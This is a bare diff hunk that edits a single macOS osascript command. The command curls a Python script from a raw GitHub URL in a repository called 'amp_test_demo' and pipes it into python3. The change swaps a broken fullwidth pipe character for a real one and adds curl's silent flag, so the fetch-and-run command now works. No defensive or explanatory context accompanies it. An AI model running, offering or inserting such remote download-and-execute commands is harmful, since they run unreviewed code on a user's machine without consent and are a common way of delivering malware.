@@ -1,1 +1,1 @@
-osascript -e 'do shell script "nohup curl https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250709/asset.py ｜ python3 - > /dev/null 2>&1"' 
+osascript -e 'do shell script "nohup curl -s https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250709/asset.py | python3 -" '
